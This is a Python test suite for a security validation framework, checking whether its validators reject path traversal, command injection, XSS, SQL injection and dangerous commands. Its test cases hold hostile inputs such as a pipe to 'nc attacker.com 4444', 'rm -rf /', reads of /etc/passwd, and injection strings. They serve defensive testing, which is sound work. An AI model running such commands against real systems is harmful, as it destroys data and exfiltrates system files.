#!/usr/bin/env python3
"""
Security Validation Framework Test Suite

Comprehensive tests for the enhanced security validation framework.
Tests injection prevention, input sanitization, and security logging.
"""

import sys
import tempfile
import subprocess
from pathlib import Path
from typing import Dict, Any

# Add utils to path for imports
utils_path = str(Path(__file__).parent)
sys.path.insert(0, utils_path)

try:
    from validation import InputValidator, SystemValidator, SecurityLogger, SecurityPatterns
except ImportError as e:
    print(f"Error importing validation modules: {e}")
    sys.exit(1)


class SecurityValidationTester:
    """Comprehensive security validation test suite."""
    
    def __init__(self):
        """Initialize test suite."""
        self.input_validator = InputValidator(use_colors=False, enable_logging=True)
        self.system_validator = SystemValidator(use_colors=False, enable_logging=True)
        self.patterns = SecurityPatterns()
        self.test_results = []
    
    def test_path_traversal_prevention(self) -> Dict[str, Any]:
        """Test path traversal attack prevention."""
        test_cases = [
            ("../../../etc/passwd", False, "Directory traversal attempt"),
            ("..\\..\\..\\windows\\system32", False, "Windows directory traversal"),
            ("/tmp/safe_file.txt", True, "Safe absolute path"),
            ("safe_file.txt", True, "Safe relative path"),
            ("file\x00.txt", False, "Null byte injection"),
            ("file<>:\"|?*.txt", False, "Invalid filename characters"),
        ]
        
        passed = 0
        total = len(test_cases)
        
        for path, expected, description in test_cases:
            result = self.input_validator.validate_path(path)
            if result == expected:
                passed += 1
            else:
                print(f"FAIL: {description} - Expected {expected}, got {result}")
        
        return {
            "test_name": "Path Traversal Prevention",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_command_injection_prevention(self) -> Dict[str, Any]:
        """Test command injection attack prevention."""
        test_cases = [
            ("python3", True, "Safe whitelisted command"),
            ("python3; rm -rf /", False, "Command injection with semicolon"),
            ("python3 && cat /etc/passwd", False, "Command chaining"),
            ("python3 | nc attacker.com 4444", False, "Pipe to external host"),
            ("python3 `whoami`", False, "Backtick command substitution"),
            ("python3 $(id)", False, "Dollar command substitution"),
            ("malicious_command", False, "Non-whitelisted command"),
            ("python3", True, "Valid command without args"),
        ]
        
        passed = 0
        total = len(test_cases)
        
        for command, expected, description in test_cases:
            result = self.input_validator.validate_command(command, allow_args=True)
            if result == expected:
                passed += 1
            else:
                print(f"FAIL: {description} - Expected {expected}, got {result}")
        
        return {
            "test_name": "Command Injection Prevention",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_api_key_validation(self) -> Dict[str, Any]:
        """Test API key validation security."""
        test_cases = [
            ("sk-1234567890abcdef1234567890abcdef", True, "Valid API key format"),
            ("short", False, "Too short API key"),
            ("sk-<script>alert('xss')</script>", False, "XSS attempt in API key"),
            ("sk-valid_key-123", True, "Valid key with underscores and hyphens"),
            ("sk-123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890", False, "Excessively long API key"),
            ("", False, "Empty API key"),
            ("sk-123'OR'1'='1", False, "SQL injection attempt"),
        ]
        
        passed = 0
        total = len(test_cases)
        
        for api_key, expected, description in test_cases:
            result = self.input_validator.validate_api_key(api_key)
            if result == expected:
                passed += 1
            else:
                print(f"FAIL: {description} - Expected {expected}, got {result}")
        
        return {
            "test_name": "API Key Validation",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_input_sanitization(self) -> Dict[str, Any]:
        """Test input sanitization functionality."""
        test_cases = [
            ("Normal text input", "Normal text input", "Clean input unchanged"),
            ("<script>alert('xss')</script>", "", "Script tags removed"),
            ("javascript:alert('xss')", "", "JavaScript protocol removed"),
            ("Text with\x00null\x01bytes", "Text with bytes", "Control characters removed"),
            ("Multiple   spaces\t\tand\n\ntabs", "Multiple spaces and tabs", "Whitespace normalized"),
            ("Very " + "long " * 200 + "input", True, "Long input truncated"),  # Should be truncated
        ]
        
        passed = 0
        total = len(test_cases)
        
        for input_text, expected, description in test_cases:
            result = self.input_validator.sanitize_input(input_text)
            
            if description == "Long input truncated":
                # Special case: check if result is truncated
                if result and len(result) <= 1000:
                    passed += 1
                else:
                    print(f"FAIL: {description} - Input not properly truncated")
            elif result == expected:
                passed += 1
            else:
                print(f"FAIL: {description} - Expected '{expected}', got '{result}'")
        
        return {
            "test_name": "Input Sanitization",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_secure_command_execution(self) -> Dict[str, Any]:
        """Test secure command execution."""
        test_cases = [
            ("python3", ["--version"], True, "Safe command with safe args"),
            ("python3", ["--version; rm -rf /"], False, "Injection in arguments"),
            ("rm", ["-rf", "/"], False, "Dangerous command"),
            ("python3", [], True, "Safe command without args"),
        ]
        
        passed = 0
        total = len(test_cases)
        
        for command, args, expected, description in test_cases:
            try:
                result = self.system_validator.execute_command_safely(
                    command, args, timeout=5
                )
                success = result["success"] if expected else not result["success"]
                if success or not expected:  # If we expect failure, any result is ok
                    passed += 1
                else:
                    print(f"FAIL: {description} - Unexpected result: {result}")
            except Exception as e:
                if not expected:  # If we expect failure, exceptions are ok
                    passed += 1
                else:
                    print(f"FAIL: {description} - Exception: {e}")
        
        return {
            "test_name": "Secure Command Execution",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_config_validation(self) -> Dict[str, Any]:
        """Test configuration validation."""
        test_cases = [
            ({"valid_key": "valid_value"}, True, "Valid configuration"),
            ({"key": "value'; DROP TABLE users; --"}, False, "SQL injection in config"),
            ({"<script>": "xss_attempt"}, False, "XSS in config key"),
            ({"valid_key": ["list", "of", "values"]}, True, "Valid list configuration"),
            ({"nested": {"key": "value"}}, True, "Valid nested configuration"),
            ("invalid_json_string", False, "Invalid JSON string"),
        ]
        
        passed = 0
        total = len(test_cases)
        
        for config, expected, description in test_cases:
            try:
                result = self.system_validator.validate_json_config(config)
                success = result["valid"] == expected
                if success:
                    passed += 1
                else:
                    print(f"FAIL: {description} - Expected {expected}, got {result['valid']}")
            except Exception as e:
                if not expected:  # If we expect failure, exceptions might be ok
                    passed += 1
                else:
                    print(f"FAIL: {description} - Exception: {e}")
        
        return {
            "test_name": "Configuration Validation",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def test_security_logging(self) -> Dict[str, Any]:
        """Test security event logging."""
        passed = 0
        total = 3
        
        try:
            # Test validation failure logging
            self.input_validator.validate_path("../../../etc/passwd")
            passed += 1  # Should log without throwing
        except Exception:
            print("FAIL: Validation failure logging threw exception")
        
        try:
            # Test command validation logging
            self.input_validator.validate_command("malicious; rm -rf /")
            passed += 1  # Should log without throwing
        except Exception:
            print("FAIL: Command validation logging threw exception")
        
        try:
            # Test API key validation logging
            self.input_validator.validate_api_key("<script>alert('xss')</script>")
            passed += 1  # Should log without throwing
        except Exception:
            print("FAIL: API key validation logging threw exception")
        
        return {
            "test_name": "Security Logging",
            "passed": passed,
            "total": total,
            "success_rate": (passed / total) * 100
        }
    
    def run_all_tests(self) -> None:
        """Run all security validation tests."""
        print("🔐 Security Validation Framework Test Suite")
        print("=" * 50)
        
        test_methods = [
            self.test_path_traversal_prevention,
            self.test_command_injection_prevention,
            self.test_api_key_validation,
            self.test_input_sanitization,
            self.test_secure_command_execution,
            self.test_config_validation,
            self.test_security_logging,
        ]
        
        total_passed = 0
        total_tests = 0
        
        for test_method in test_methods:
            result = test_method()
            self.test_results.append(result)
            
            status = "✅ PASS" if result["success_rate"] == 100 else "⚠️  PARTIAL" if result["success_rate"] > 80 else "❌ FAIL"
            print(f"{status} {result['test_name']}: {result['passed']}/{result['total']} ({result['success_rate']:.1f}%)")
            
            total_passed += result["passed"]
            total_tests += result["total"]
        
        print("=" * 50)
        overall_success = (total_passed / total_tests) * 100
        overall_status = "✅ PASS" if overall_success == 100 else "⚠️  PARTIAL" if overall_success > 80 else "❌ FAIL"
        print(f"{overall_status} Overall: {total_passed}/{total_tests} ({overall_success:.1f}%)")
        
        if overall_success == 100:
            print("\n🎉 All security validation tests passed!")
        elif overall_success > 80:
            print("\n⚠️  Most security validation tests passed. Review failed cases.")
        else:
            print("\n🚨 Security validation framework has significant issues. Immediate attention required.")
    
    def generate_security_report(self) -> str:
        """Generate a comprehensive security validation report."""
        report = []
        report.append("# Security Validation Framework Report")
        report.append("=" * 50)
        report.append("")
        
        for result in self.test_results:
            report.append(f"## {result['test_name']}")
            report.append(f"- Tests Passed: {result['passed']}/{result['total']}")
            report.append(f"- Success Rate: {result['success_rate']:.1f}%")
            report.append("")
        
        total_passed = sum(r["passed"] for r in self.test_results)
        total_tests = sum(r["total"] for r in self.test_results)
        overall_success = (total_passed / total_tests) * 100
        
        report.append("## Overall Assessment")
        report.append(f"- Total Tests: {total_tests}")
        report.append(f"- Total Passed: {total_passed}")
        report.append(f"- Overall Success Rate: {overall_success:.1f}%")
        report.append("")
        
        if overall_success == 100:
            report.append("✅ **Status: SECURE** - All security validation tests passed.")
        elif overall_success > 80:
            report.append("⚠️  **Status: MOSTLY SECURE** - Most tests passed, review failures.")
        else:
            report.append("🚨 **Status: INSECURE** - Significant security issues detected.")
        
        return "\n".join(report)


def main():
    """Run security validation tests."""
    try:
        tester = SecurityValidationTester()
        tester.run_all_tests()
        
        # Generate and save report
        report = tester.generate_security_report()
        
        # Try to save report to file
        try:
            report_path = Path(__file__).parent / "security_validation_report.txt"
            with open(report_path, 'w') as f:
                f.write(report)
            print(f"\n📋 Detailed report saved to: {report_path}")
        except Exception as e:
            print(f"\n⚠️  Could not save report: {e}")
            print("\n📋 Report content:")
            print(report)
            
    except Exception as e:
        print(f"❌ Test suite failed to run: {e}")
        return 1
    
    return 0


if __name__ == "__main__":
    sys.exit(main())